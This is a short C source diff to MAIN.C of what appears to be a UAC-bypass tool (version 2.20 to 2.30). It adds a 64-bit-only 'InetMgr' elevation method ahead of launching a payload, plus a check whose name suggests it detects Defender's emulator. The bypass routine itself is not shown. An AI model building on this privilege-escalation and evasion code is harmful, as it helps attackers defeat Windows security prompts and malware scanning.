@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.20
+*  VERSION:     2.30
 *
-*  DATE:        25 May 2016
+*  DATE:        14 June 2016
 *
 *  Program entry point.
 *
@@ -266,6 +266,8 @@ UINT ucmMain()
     CompressPayload();
 #endif
 
+    supCheckMSEngineVFS();
+
     uResult = ucmInit();
     switch (uResult) {
 
@@ -430,6 +432,14 @@ UINT ucmMain()
             return ERROR_UNSUPPORTED_TYPE;
         }
         break;
+
+    case UacMethodInetMgr:
+#ifndef _WIN64
+        ucmShowMessage(WIN64ONLY);
+        return ERROR_UNSUPPORTED_TYPE;
+#endif
+        break;
+
     }
 
     //prepare command for payload
@@ -626,6 +636,16 @@ UINT ucmMain()
         }
         break;
 
+        //allow only in win64 version
+#ifdef _WIN64
+    case UacMethodInetMgr:
+
+        OutputDebugString(L"[UCM] Please be patient, this can take some time due to a file scan");
+        if (ucmInetMgrMethod()) {
+            return ERROR_SUCCESS;
+        }
+        break;
+#endif
     }
 
     return ERROR_ACCESS_DENIED;
